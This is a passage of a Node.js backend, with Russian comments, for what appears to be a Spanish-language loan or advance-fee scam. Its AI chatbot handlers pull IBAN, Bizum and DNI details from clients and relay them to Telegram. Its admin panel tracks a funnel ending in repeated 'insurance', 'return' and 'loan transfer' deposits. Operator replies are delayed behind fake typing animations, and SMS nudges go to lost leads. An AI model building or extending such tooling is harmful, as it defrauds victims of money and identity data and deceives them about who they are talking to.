          sendToTelegram(tgLines.join('\n'));
        }
      } catch (e) {
        console.error('[chat] token save error:', e?.message);
      }
    }

    const extra = {};
    if (extractedIban)  extra.collectedIban  = extractedIban;
    if (extractedBizum) extra.collectedBizum = extractedBizum;
    if (extractedDni)   extra.collectedDni   = extractedDni;
    if (paymentDetails.paymentMethod) extra.paymentMethod = paymentDetails.paymentMethod;
    return reply.send({ reply: replyText, ...(isDone ? { done: true } : {}), ...extra });
  } catch (err) {
    console.error('[chat] error:', err?.message || err);
    return reply.status(500).send({ error: 'chat_failed' });
  }
}

async function handleChatHistory(req, reply) {
  const sessionId = sanitizeString(req.params.sessionId || '', 80);
  reply.header('Cache-Control', 'no-store');
  if (!sessionId) return reply.send({ messages: [] });
  const lead = await prisma.lead.findUnique({ where: { tgId: leadKeyFromSession(sessionId) } });
  if (!lead) return reply.send({ messages: [] });
  const history = await prisma.message.findMany({
    where: { leadId: lead.id },
    orderBy: { createdAt: 'asc' },
    select: { role: true, content: true },
  });
  return reply.send({
    messages: history.map((m) => ({ role: m.role.toLowerCase(), content: m.content })),
  });
}

// ─── Admin panel (/admin.html) ────────────────────────────────────────────────

async function handleAdminLogin(req, reply) {
  if (rateLimited(req, reply, 'login-admin', 10, 5 * 60 * 1000)) return;
  const body = asRecord(req.body) ?? {};
  const login = getString(body.login);
  const password = getString(body.password);
  if (!safeEqual(login, config.admin.login) || !safeEqual(password, config.admin.password)) {
    return reply.status(401).send({ error: 'Неверный логин или пароль' });
  }
  rateReset(req, 'login-admin');
  const token = randomUUID() + randomUUID();
  sessionAdd(adminSessions, token);
  return reply.send({ token });
}

async function handleAdminLogout(req, reply) {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7).trim() : '';
  if (token) { adminSessions.delete(token); saveSessions(); }
  return reply.send({ ok: true });
}

async function serializeBotConfig(cfg) {
  // providerHasKey ходит в БД за ключом (он может быть задан из админки), поэтому async.
  const [deepseekKey, openaiKey] = await Promise.all([
    providerHasKey('deepseek'),
    providerHasKey('openai'),
  ]);
  return {
    systemPrompt: cfg.systemPrompt,
    provider: cfg.provider || 'deepseek',
    model: cfg.model,
    temperature: cfg.temperature,
    maxTokens: cfg.maxTokens,
    historyLimit: cfg.historyLimit,
    tgRequestLogging: cfg.tgRequestLogging === true,
    aiEnabled: cfg.aiEnabled,
    // Есть ли ключ у каждого провайдера — чтобы админка предупредила, если не задан.
    providerKeys: { deepseek: deepseekKey, openai: openaiKey },
  };
}

async function handleGetBotConfig(req, reply) {
  if (!requireAdmin(req, reply)) return;
  const cfg = await getBotConfig();
  return reply.send(await serializeBotConfig(cfg));
}

async function handleUpdateBotConfig(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const patch = {};
    // Промпт: разрешаем многострочный текст, до 20000 символов (sanitizeString сохраняет \n).
    if (typeof body.systemPrompt === 'string') patch.systemPrompt = sanitizeString(body.systemPrompt, 20000);
    if (typeof body.provider === 'string') patch.provider = sanitizeString(body.provider, 20);
    if (typeof body.model === 'string') patch.model = sanitizeString(body.model, 80);
    if (typeof body.temperature === 'number') patch.temperature = body.temperature;
    if (typeof body.maxTokens === 'number') patch.maxTokens = body.maxTokens;
    if (typeof body.historyLimit === 'number') patch.historyLimit = body.historyLimit;
    if (typeof body.tgRequestLogging === 'boolean') patch.tgRequestLogging = body.tgRequestLogging;
    if (typeof body.aiEnabled === 'boolean') patch.aiEnabled = body.aiEnabled;

    const updated = await updateBotConfig(patch);
    return reply.send(await serializeBotConfig(updated));
  } catch (err) {
    console.error('[admin] update bot-config error:', err?.message || err);
    return reply.status(500).send({ error: 'update_failed' });
  }
}

// ── Ключи провайдеров ИИ ──────────────────────────────────────────────────────
// Ключ из БД перебивает .env (см. src/ai/credentials.js), поэтому ротация
// делается без ssh и без перезапуска. Наружу ключ никогда не отдаём — только хвост.

// Сравнение секретов постоянным временем; хэш уравнивает длину строк.
function secretEquals(a, b) {
  const ha = createHash('sha256').update(String(a || '')).digest();
  const hb = createHash('sha256').update(String(b || '')).digest();
  return timingSafeEqual(ha, hb);
}

// Приём нового ключа от userscript'а в браузере (Tampermonkey на консоли провайдера).
// Админ-сессии у него нет, поэтому авторизация — отдельный секрет AI_KEY_INGEST_SECRET.
async function handleIngestAiKey(req, reply) {
  if (!config.keyIngestSecret) return reply.status(503).send({ error: 'ingest_disabled' });
  if (!secretEquals(req.headers['x-ingest-secret'], config.keyIngestSecret)) {
    console.warn('[ai-key] отклонён приём: неверный секрет, ip=', getClientIp(req));
    return reply.status(401).send({ error: 'unauthorized' });
  }
  try {
    const body = asRecord(req.body) ?? {};
    const provider = String(getString(body.provider) || 'deepseek').trim().toLowerCase();
    const apiKey = String(getString(body.apiKey) || '').trim();
    if (!CREDENTIAL_PROVIDERS.includes(provider)) {
      return reply.status(400).send({ error: 'unknown_provider' });
    }
    // Формат ключа обоих провайдеров: sk-… Отсекаем мусор и обрезанные значения.
    if (!/^sk-[A-Za-z0-9_-]{16,}$/.test(apiKey)) {
      return reply.status(400).send({ error: 'bad_key_format' });
    }
    await setApiKey(provider, apiKey, 'userscript');
    console.log(`[ai-key] принят ключ ${provider} ${maskKey(apiKey)} от userscript`);
    sendPlainToTelegram(`🔑 Ключ ${provider} обновлён из userscript: ${maskKey(apiKey)}`);
    return reply.send({ ok: true, provider, masked: maskKey(apiKey) });
  } catch (err) {
    console.error('[ai-key] ingest error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleGetAiKeys(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    return reply.send({
      items: await listCredentials(),
      ingestEnabled: !!config.keyIngestSecret,
    });
  } catch (err) {
    console.error('[ai-key] list error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleSetAiKey(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const provider = String(req.params.provider || '').trim().toLowerCase();
    if (!CREDENTIAL_PROVIDERS.includes(provider)) {
      return reply.status(400).send({ error: 'unknown_provider' });
    }
    const body = asRecord(req.body) ?? {};
    const apiKey = String(getString(body.apiKey) || '').trim();
    if (!/^sk-[A-Za-z0-9_-]{16,}$/.test(apiKey)) {
      return reply.status(400).send({ error: 'bad_key_format' });
    }
    await setApiKey(provider, apiKey, 'admin');
    console.log(`[ai-key] ключ ${provider} задан из админки: ${maskKey(apiKey)}`);
    sendPlainToTelegram(`🔑 Ключ ${provider} заменён вручную из админки: ${maskKey(apiKey)}`);
    return reply.send({ ok: true, items: await listCredentials() });
  } catch (err) {
    console.error('[ai-key] set error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// Удаляет запись из БД — провайдер возвращается на ключ из .env.
async function handleDeleteAiKey(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const provider = String(req.params.provider || '').trim().toLowerCase();
    if (!CREDENTIAL_PROVIDERS.includes(provider)) {
      return reply.status(400).send({ error: 'unknown_provider' });
    }
    await clearApiKey(provider);
    console.log(`[ai-key] ключ ${provider} сброшен на .env`);
    sendPlainToTelegram(`🔑 Ключ ${provider} сброшен из админки — провайдер вернулся на .env`);
    return reply.send({ ok: true, items: await listCredentials() });
  } catch (err) {
    console.error('[ai-key] delete error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleGeo(req, reply) {
  const ip = getClientIp(req);
  try {
    const result = await resolveGeo(req, ip);
    const geo = result.geo || {};
    if (!result.available || !geo.country) {
      return reply.send({ ok: false });
    }
    return reply.send({
      ok: true,
      country: geo.country || '',
      city: geo.city || '',
      region: geo.region || '',
      postal: geo.postal || '',
    });
  } catch {
    return reply.send({ ok: false });
  }
}

// ── Public settings (IBAN / beneficiario) ────────────────────────────────────
async function handleGetSettings(req, reply) {
  return reply.send(await readSettings());
}

async function handleUpdateSettings(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const settings = await readSettings();
    const iban = sanitizeString(getString(body.iban), 50);
    const beneficiario = sanitizeString(getString(body.beneficiario), 200);
    const comentario = sanitizeString(getString(body.comentario), 80);
    const swiftBic = sanitizeString(getString(body.swiftBic), 40);
    const paisDestino = sanitizeString(getString(body.paisDestino), 80);
    const paymentType = getString(body.paymentType);
    if (typeof body.paymentUnavailable === 'boolean') settings.paymentUnavailable = body.paymentUnavailable;
    if (typeof body.landingWhiteEnabled === 'boolean') settings.landingWhiteEnabled = body.landingWhiteEnabled;
    if (paymentType && ['iban', 'bizum'].includes(paymentType)) settings.paymentType = paymentType;
    if (iban) settings.iban = iban;
    if (beneficiario) settings.beneficiario = beneficiario;
    if (comentario) settings.comentario = comentario;
    if (typeof body.swiftBic === 'string') settings.swiftBic = swiftBic;
    if (paisDestino) settings.paisDestino = paisDestino;
    await writeSettings(settings);
    return reply.send(settings);
  } catch (err) {
    console.error('[settings] update error:', err?.message || err);
    return reply.status(500).send({ error: 'update_failed' });
  }
}

// ── Сценарий обработки (тексты этапов) ────────────────────────────────────────
async function handleGetScenarioSettings(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    return reply.send(scenarioPayload(await readSettings()));
  } catch (err) {
    console.error('[scenario/get] error:', err?.message);
    return reply.status(500).send({ error: 'get_failed' });
  }
}

async function handleUpdateScenarioSettings(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const settings = await readSettings();
    for (const key of SCENARIO_FIELDS) {
      if (typeof body[key] === 'string') settings[key] = sanitizeString(body[key], 4000);
    }
    await writeSettings(settings);
    return reply.send(scenarioPayload(settings));
  } catch (err) {
    console.error('[scenario/update] error:', err?.message);
    return reply.status(500).send({ error: 'update_failed' });
  }
}

// Те же тексты для панели оператора (без админ-прав, но с чат-оп авторизацией).
async function handleChatOpScenario(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    return reply.send(scenarioPayload(await readSettings()));
  } catch (err) {
    console.error('[chat-op/scenario]', err?.message || err);
    return reply.status(500).send({ error: 'get_failed' });
  }
}

// Отметка «шаг сценария выполнен» — храним в submissionData.scenarioSteps,
// чтобы галочки переживали перезаход оператора и были видны любому из них.
async function handleChatOpScenarioStep(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const step = sanitizeString(getString(body.step), 40);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });
    if (!step) return reply.status(400).send({ error: 'step required' });
    const done = body.done !== false;

    const existing = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { submissionData: true },
    }).catch(() => null);
    const sub = (existing?.submissionData && typeof existing.submissionData === 'object')
      ? existing.submissionData : {};
    const steps = (sub.scenarioSteps && typeof sub.scenarioSteps === 'object') ? { ...sub.scenarioSteps } : {};
    if (done) steps[step] = new Date().toISOString();
    else delete steps[step];

    await mergeSubmissionData(sessionId, { scenarioSteps: steps });
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true, scenarioSteps: steps });
  } catch (err) {
    console.error('[chat-op/scenario-step]', err?.message || err);
    return reply.status(500).send({ error: 'step_failed' });
  }
}

async function paymentRequisiteStatusPayload() {
  const clients = await prisma.webClient.findMany({ select: { flowSessionId: true } });
  return { counts: getRequisiteStatusCounts(clients.map((client) => client.flowSessionId)) };
}

async function handleGetPaymentRequisiteStatuses(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    return reply.send(await paymentRequisiteStatusPayload());
  } catch (err) {
    console.error('[payment-requisites/statuses]', err?.message || err);
    return reply.status(500).send({ error: 'status_read_failed' });
  }
}

async function handleRefreshPaymentRequisites(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const result = await refreshPaymentRequisites();
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true, ...result, ...(await paymentRequisiteStatusPayload()) });
  } catch (err) {
    console.error('[payment-requisites/refresh]', err?.message || err);
    return reply.status(500).send({ error: 'refresh_failed' });
  }
}

// ── Список всех платежей (депозитов) для правой колонки вкладки «Платёжка» ──────
const DEPOSIT_TYPE_LABEL = { FD: 'FD', RD: 'RD1', RD2: 'RD2', RD3: 'RD3' };
const DEPOSIT_TYPE_TO_PAYMENT = { FD: 'insurance', RD: 'return', RD2: 'loantransfer', RD3: 'creditcard' };

async function handleAdminPayments(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const deposits = await prisma.deposit.findMany({
      orderBy: { confirmedAt: 'desc' },
      take: 500,
      include: { client: { select: { nombre: true, email: true, handlerId: true } } },
    });
    const handlers = await prisma.handler.findMany({ select: { id: true, name: true } });
    const handlerName = new Map(handlers.map((h) => [h.id, h.name]));
    // Обработчик на момент платежа: интервал владения, в который попал confirmedAt.
    // Текущий handlerId клиента тут не годится — после передачи лида он задним
    // числом переписал бы автора всех прошлых платежей на нового обработчика.
    const depClientIds = [...new Set(deposits.map((d) => d.clientId))];
    const spans = depClientIds.length
      ? await prisma.clientAssignment.findMany({
          where: { clientId: { in: depClientIds } },
          select: { clientId: true, handlerId: true, startedAt: true, endedAt: true },
        })
      : [];
    const spansByClient = new Map();
    for (const s of spans) {
      const arr = spansByClient.get(s.clientId) || [];
      arr.push(s);
      spansByClient.set(s.clientId, arr);
    }
    const handlerAtMoment = (clientId, at) => {
      const t = new Date(at).getTime();
      const arr = spansByClient.get(clientId) || [];
      const hit = arr.find((s) => (
        t >= new Date(s.startedAt).getTime()
        && t < (s.endedAt ? new Date(s.endedAt).getTime() : Infinity)
      ));
      if (hit) return hit.handlerId;
      // Платёж раньше первого интервала (подтвердили до Start) — он принадлежит
      // первому обработчику лида, а не текущему.
      let first = null;
      for (const s of arr) {
        if (!first || new Date(s.startedAt) < new Date(first.startedAt)) first = s;
      }
      return first && t < new Date(first.startedAt).getTime() ? first.handlerId : null;
    };
    const items = deposits.map((d) => {
      const pKey = paymentStatusKey(d.flowSessionId, DEPOSIT_TYPE_TO_PAYMENT[d.type] || 'insurance');
      const ps = paymentStatus.get(pKey) || {};
      // Фоллбэк на текущего handlerId — только для платежей старше истории привязок.
      const ownerId = handlerAtMoment(d.clientId, d.confirmedAt) || d.client?.handlerId || null;
      const approvedByName = ps.confirmedByName
        || (ownerId ? handlerName.get(ownerId) : '')
        || '—';
      return {
        id: d.id,
        flowSessionId: d.flowSessionId,
        type: d.type,
        typeLabel: DEPOSIT_TYPE_LABEL[d.type] || d.type,
        amount: d.amount,
        confirmedAt: d.confirmedAt,
        clientName: d.client?.nombre || '—',
        clientEmail: d.client?.email || '',
        approvedByName,
        screenshotUrl: ps.url || '',
        requisiteStatus: getRequisiteStatus(d.flowSessionId),
      };
    });
    return reply.send({ payments: items });
  } catch (err) {
    console.error('[admin/payments]', err?.message || err);
    return reply.status(500).send({ error: 'load_failed' });
  }
}

async function handleAdminCancelPayment(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const id = sanitizeString(getString(body.id), 40);
    if (!id) return reply.status(400).send({ error: 'missing id' });
    const dep = await prisma.deposit.findUnique({ where: { id } });
    if (!dep) return reply.status(404).send({ error: 'not_found' });
    // 1) Удаляем депозит — уходит из общей и обработчиковой статистики.
    await prisma.deposit.delete({ where: { id } });
    // 2) Сбрасываем статус оплаты (карточка/чат больше не показывают «подтверждено»).
    const paymentType = DEPOSIT_TYPE_TO_PAYMENT[dep.type] || 'insurance';
    const key = paymentStatusKey(dep.flowSessionId, paymentType);
    const ps = paymentStatus.get(key);
    if (ps) {
      paymentStatus.set(key, { ...ps, status: 'rejected', confirmedAt: null, confirmedByName: null, confirmedByHandlerId: null });
      await savePaymentStatus();
    }
    // 3) Снежок → солнышко.
    const entry = requisiteStatusBySession.get(dep.flowSessionId);
    if (entry && entry.status === 'snowflake') {
      requisiteStatusBySession.set(dep.flowSessionId, { status: 'sun', changedAt: Date.now() });
      await saveRequisiteStatuses();
    }
    notifyClients();
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[admin/payments/cancel]', err?.message || err);
    return reply.status(500).send({ error: 'cancel_failed' });
  }
}

// Режим авто-СМС потеряшкам:
//   'off'      — ничего не отправляем;
//   'reminder' — только СМС-напоминание;
//   'review'   — СМС + редирект клиента на страницу отзывов.
// Старые настройки без поля mode: enabled=true исторически значил СМС+отзывы,
// поэтому маппим его в 'review', чтобы поведение не изменилось после обновления.
function resolveSmsReminderMode(settings) {
  const m = settings.smsReminderMode;
  if (m === 'off' || m === 'reminder' || m === 'review') return m;
  return settings.smsReminderEnabled ? 'review' : 'off';
}

async function handleGetSmsReminderSettings(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const settings = await readSettings();
    return reply.send({
      mode: resolveSmsReminderMode(settings),
      enabled: settings.smsReminderEnabled || false,
      enabledAt: settings.smsReminderEnabledAt || null,
      minutes: settings.smsReminderMinutes || 20,
      sender: settings.smsReminderSender || 'AvalAvance',
      text: settings.smsReminderText || 'Привет',
    });
  } catch (err) {
    console.error('[sms-reminder/get] error:', err?.message);
    return reply.status(500).send({ error: 'get_failed' });
  }
}

async function handleUpdateSmsReminderSettings(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const settings = await readSettings();

    // Новый интерфейс шлёт mode; старый — enabled (boolean). Поддерживаем оба.
    let nextMode = null;
    if (typeof body.mode === 'string' && ['off', 'reminder', 'review'].includes(body.mode)) {
      nextMode = body.mode;
    } else if (typeof body.enabled === 'boolean') {
      nextMode = body.enabled ? 'review' : 'off';
    }
    if (nextMode) {
      const wasEnabled = !!settings.smsReminderEnabled;
      const nowEnabled = nextMode !== 'off';
      settings.smsReminderMode = nextMode;
      settings.smsReminderEnabled = nowEnabled; // держим в синхроне для цикла отправки
      // enabledAt задаёт когорту (шлём только клиентам, созданным после включения).
      // Ставим его при переходе выключено→включено; переключение reminder↔review
      // когорту не сбрасывает.
      if (nowEnabled && !wasEnabled) settings.smsReminderEnabledAt = new Date().toISOString();
      if (!nowEnabled) settings.smsReminderEnabledAt = null;
    }
    if (settings.smsReminderEnabled && !settings.smsReminderEnabledAt) {
      settings.smsReminderEnabledAt = new Date().toISOString();
    }
    if (typeof body.minutes === 'number') settings.smsReminderMinutes = Math.max(1, body.minutes);
    if (typeof body.sender === 'string') settings.smsReminderSender = sanitizeString(body.sender, 50);
    if (typeof body.text === 'string') settings.smsReminderText = sanitizeString(body.text, 1600);

    await writeSettings(settings);

    return reply.send({
      mode: resolveSmsReminderMode(settings),
      enabled: settings.smsReminderEnabled || false,
      enabledAt: settings.smsReminderEnabledAt || null,
      minutes: settings.smsReminderMinutes || 20,
      sender: settings.smsReminderSender || 'AvalAvance',
      text: settings.smsReminderText || 'Привет',
    });
  } catch (err) {
    console.error('[sms-reminder/update] error:', err?.message);
    return reply.status(500).send({ error: 'update_failed' });
  }
}

// ── Admin statistics / funnel (воронка через chat/index.html, без прозвонщика) ──
// Шаги воронки:
//  1) Прошёл капчу        — webClient.captchaPassed
//  2) Бот начал диалог     — event tourist_bot_started (assistant.html)
//  3) Бот закончил диалог  — event tourist_bot_finished_dialogue|tourist_bot_finished
//  4) Подписал договор     — event tourist_card_ordered (detail-transaction.html)
//  5) Бот2 начал диалог    — event tourist_bot2_started (support-chat, серверное)
//  6) Бот2 закончил диалог — event tourist_bot2_finished (support-chat, серверное)
//  7) Началась обработка   — оператор нажал Start → CALLER_ACTION_BUTTONS в chat:-лиде
//  8) Оплатил FD           — paymentStatus insurance = confirmed (подтвердил оператор)
//  9) Оплатил RD           — paymentStatus return = confirmed (подтвердил оператор)
// 10) Оплатил RD2          — paymentStatus loantransfer = confirmed (подтвердил оператор)
// 11) Оплатил RD3          — paymentStatus creditcard = confirmed (подтвердил оператор)
async function handleAdminStats(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    // Фильтр по дате: ?from=YYYY-MM-DD&to=YYYY-MM-DD (локальные границы суток).
    // Считаем строго по этому окну — чтобы все шаги мерились от одного момента.
    const q = req.query || {};
    // «Чистый лист»: точка сброса статистики — данные до неё не учитываем нигде,
    // включая «Всё время». Хранится в настройках, БД не трогается.
    const settings = await readSettings();
    const resetMs = settings.statsResetAt ? new Date(settings.statsResetAt).getTime() : null;

    const range = {};
    const fromDate = q.from ? new Date(`${String(q.from)}T00:00:00`) : null;
    const toDate = q.to ? new Date(`${String(q.to)}T23:59:59.999`) : null;
    let fromMs = (fromDate && !isNaN(fromDate.getTime())) ? fromDate.getTime() : null;
    const toMs = (toDate && !isNaN(toDate.getTime())) ? toDate.getTime() : null;
    if (resetMs != null && !isNaN(resetMs)) {
      fromMs = fromMs != null ? Math.max(fromMs, resetMs) : resetMs;
    }
    if (fromMs != null) range.gte = new Date(fromMs);
    if (toMs != null) range.lte = new Date(toMs);
    const hasRange = Object.keys(range).length > 0;
    const dateWhere = hasRange ? { createdAt: range } : {};

    // ── Когортная воронка ─────────────────────────────────────────────────────
    // Берём КЛИЕНТОВ, прошедших капчу в окне (дата регистрации webClient.createdAt в
    // [from,to] с учётом сброса). Дальше ВСЕ шаги считаем ТОЛЬКО для этих клиентов —
    // не по дате самого события. Так «Обработка» не может быть больше «Прошёл капчу».
    let cohort = [];
    try {
      cohort = await prisma.webClient.findMany({
        where: { captchaPassed: true, ...dateWhere },
        select: { flowSessionId: true },
      });
    } catch { cohort = []; }
    const sids = cohort.map((c) => c.flowSessionId).filter(Boolean);
    const sidSet = new Set(sids);
    const passedCaptcha = sids.length;

    // Сколько из когорты дошли до события (по flowSessionId, без фильтра по дате события).
    const cohortEvent = async (eventWhere) => {
      if (!sids.length) return 0;
      const rows = await prisma.webEvent.findMany({
        where: { ...eventWhere, flowSessionId: { in: sids } },
        select: { flowSessionId: true },
        distinct: ['flowSessionId'],
      });
      return rows.length;
    };

    // Шаг 7: оператор нажал Start — маркер CALLER_ACTION_BUTTONS в chat:-лидах когорты.
    const cohortProcessing = async () => {
      if (!sids.length) return 0;
      const chatKeys = sids.map((s) => `chat:${s}`);
      const rows = await prisma.message.findMany({
        where: { content: 'CALLER_ACTION_BUTTONS', lead: { tgId: { in: chatKeys } } },
        select: { leadId: true },
        distinct: ['leadId'],
      });
      return rows.length;
    };

    const [
      totalClients,
      bot1Started,
      bot1Finished,
      contractSigned,
      bot2Started,
      bot2Finished,
      processingStarted,
    ] = await Promise.all([
      prisma.webClient.count({ where: dateWhere }),
      cohortEvent({ event: 'tourist_bot_started' }),
      cohortEvent({ event: { in: ['tourist_bot_finished_dialogue', 'tourist_bot_finished'] } }),
      cohortEvent({ event: 'tourist_card_ordered' }),
      cohortEvent({ event: 'tourist_bot2_started' }),
      cohortEvent({ event: 'tourist_bot2_finished' }),
      cohortProcessing(),
    ]);

    // Шаги 8–11: подтверждённые оплаты — только для клиентов когорты.
    let paidFD = 0;
    let paidRD = 0;
    let paidRD2 = 0;
    let paidRD3 = 0;
    for (const [k, v] of paymentStatus) {
      if (v?.status !== 'confirmed') continue;
      const key = String(k);
      const isCreditCard = key.endsWith('::creditcard');
      const isLoanTransfer = key.endsWith('::loantransfer');
      const isReturn = key.endsWith('::return');
      const sid = isCreditCard ? key.slice(0, -'::creditcard'.length)
        : (isLoanTransfer ? key.slice(0, -'::loantransfer'.length)
          : (isReturn ? key.slice(0, -'::return'.length) : key));
      if (!sidSet.has(sid)) continue;
      if (isCreditCard) paidRD3++;
      else if (isLoanTransfer) paidRD2++;
      else if (isReturn) paidRD++;
      else paidFD++;
    }

    return reply.send({
      totalClients,
      passedCaptcha,
      bot1Started,
      bot1Finished,
      contractSigned,
      bot2Started,
      bot2Finished,
      processingStarted,
      paidFD,
      paidRD,
      paidRD2,
      paidRD3,
      from: range.gte ? range.gte.toISOString() : null,
      to: range.lte ? range.lte.toISOString() : null,
      statsResetAt: settings.statsResetAt || null,
    });
  } catch (err) {
    console.error('[admin-stats] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// Сброс статистики «с чистого листа»: ставим точку сброса = сейчас.
// БД не трогаем — просто воронка перестаёт учитывать данные до этого момента.
async function handleResetStats(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const settings = await readSettings();
    settings.statsResetAt = new Date().toISOString();
    await writeSettings(settings);
    return reply.send({ ok: true, statsResetAt: settings.statsResetAt });
  } catch (err) {
    console.error('[admin-stats] reset error:', err?.message || err);
    return reply.status(500).send({ error: 'reset_failed' });
  }
}

// ─── Support chat (chat.html) ─────────────────────────────────────────────────
// Separate session prefix "chat:" keeps histories isolated from assistant.html ("web:").

async function readChatPromptFile() {
  try { return (await readFile(CHAT_PROMPT_FILE, 'utf8')).trim(); } catch { return ''; }
}

function chatLeadKey(sessionId) {
  return `chat:${sessionId}`;
}

// ─── Отложенная доставка сообщений оператора («печатает…») ────────────────────
// Сообщение менеджера прилетает клиенту не мгновенно: сперва идёт анимация
// «печатает», её длина считается от количества символов. Момент показа
// (deliverAt) лежит в БД, поэтому клиент, открывший чат позже, досматривает
// только остаток: отправили 10-секундное, зашёл через 5 → анимация 5 секунд.
const TYPING_MS_PER_CHAR = 90;
const TYPING_MIN_MS = 5000;
const TYPING_MAX_MS = 15000;
// Два сообщения подряд не должны падать пачкой — держим паузу между показами.
const OPERATOR_GAP_MS = 10000;

// Маркеры/картинки «печатать» нечего — им достаётся минимальная анимация.
function operatorTypingMs(content) {
  const text = String(content || '');
  const isMarker = /^(\[\[|\/uploads\/|PAYMENT_SCREENSHOT|CALLER_ACTION_BUTTONS|OFFER_BUTTONS)/.test(text);
  const chars = isMarker ? 0 : text.length;
  return Math.min(TYPING_MAX_MS, Math.max(TYPING_MIN_MS, Math.round(chars * TYPING_MS_PER_CHAR)));
}

async function createOperatorMessage(leadId, content, senderHandlerId = null) {
  const typingMs = operatorTypingMs(content);
  try {
    const prev = await prisma.message.findFirst({
      where: { leadId, role: 'SYSTEM' },
      orderBy: { createdAt: 'desc' },
      select: { deliverAt: true, createdAt: true },
    });
    const prevAt = prev ? new Date(prev.deliverAt || prev.createdAt).getTime() : 0;
    const deliverAt = new Date(Math.max(Date.now() + typingMs, prevAt + OPERATOR_GAP_MS));
    return await prisma.message.create({
      data: { leadId, role: 'SYSTEM', content, senderHandlerId, deliverAt, typingMs },
    });
  } catch (e) {
    if (e?.code !== 'P2022') throw e;
    // Миграция ещё не применена — доставляем сразу, без анимации.
    console.error('[chat] deliverAt/typingMs columns missing — migration required');
    return prisma.message.create({ data: { leadId, role: 'SYSTEM', content, senderHandlerId } });
  }
}

async function handleSupportChat(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });

    const message = sanitizeString(getString(body.message), 4000);
    const start = body.start === true;
    const name = sanitizeString(getString(body.name), 120);
    const bank = sanitizeString(getString(body.bank), 120);

    if (!start && !message) return reply.status(400).send({ error: 'message required' });

    // Client is active — cancel any pending push notification
    if (!start) cancelPush(sessionId);

    const key = chatLeadKey(sessionId);
    const lead = await prisma.lead.upsert({
      where: { tgId: key },
      create: { tgId: key, chatId: key, firstName: name || null },
      update: name ? { firstName: name } : {},
    });

    // As soon as chat opens — make client visible to chat operator immediately
    if (start) {
      const ip = getClientIp(req);
      // Клиент пока общается с ИИ — статус 'ЧАТ: БОТ' (НЕ виден чат-оператору).
      // Чат попадёт к оператору только после [[DONE]] (статус → 'ЗАПРОСИЛ ЗВОНОК (ЧЕРЕЗ ЧАТ)').
      // 'ЧАТ: АКТИВЕН' в skip — чтобы переоткрытие чата после ответа оператора не откатывало статус.
      const skipStatuses = new Set(['ЗАПРОСИЛ ЗВОНОК (ЧЕРЕЗ ЧАТ)', 'ЧАТ: НУЖЕН ЗВОНОК', 'ОПЕРАТОР ПРОЗВОНИЛ', 'ЧАТ: АКТИВЕН']);
      try {
        const existing = await prisma.webClient.findUnique({
          where: { flowSessionId: sessionId },
          select: { status: true, handlerId: true },
        });
        const shouldSetStatus = !existing || !skipStatuses.has(existing.status || '');
        // Роутинг: новый/непривязанный лид назначаем активному обработчику из настроек.
        let routingHandlerId = null;
        if (!existing || !existing.handlerId) {
          routingHandlerId = (await readSettings()).routingHandlerId || null;
        }
        const upserted = await prisma.webClient.upsert({
          where: { flowSessionId: sessionId },
          create: {
            flowSessionId: sessionId,
            status: 'ЧАТ: БОТ',
            ip: ip || '',
            ...(routingHandlerId ? { handlerId: routingHandlerId } : {}),
            ...(name ? { nombre: name } : {}),
            ...(bank ? { bank } : {}),
          },
          update: {
            ip: ip || '',
            ...(routingHandlerId ? { handlerId: routingHandlerId } : {}),
            ...(name ? { nombre: name } : {}),
            ...(bank ? { bank } : {}),
            ...(shouldSetStatus ? { status: 'ЧАТ: БОТ' } : {}),
          },
          select: { id: true, assignedAt: true },
        });
        // Обычно роутинг срабатывает до Start, когда когорты ещё нет — интервал
        // откроется вместе с assignedAt. Но лид мог стартовать без обработчика
        // (assignedAt есть, handlerId пуст) — тогда открываем интервал здесь.
        if (routingHandlerId && upserted.assignedAt) {
          const open = await prisma.clientAssignment.count({
            where: { clientId: upserted.id, endedAt: null },
          });
          if (!open) await openAssignmentInterval(upserted.id, routingHandlerId, new Date());
        }
        broadcastUpdate('clients_changed');
      } catch { /* non-fatal */ }
    }

    // Track payment screenshot status
    const paymentMessage = parsePaymentScreenshotMessage(message);
    if (paymentMessage) {
      paymentStatus.set(paymentStatusKey(sessionId, paymentMessage.type), {
        status: 'pending',
        url: paymentMessage.url,
        sentAt: Date.now(),
        type: paymentMessage.type,
      });
      await savePaymentStatus();
      broadcastUpdate('clients_changed');
    }

    // If AI is disabled — save the message for audit but don't call AI
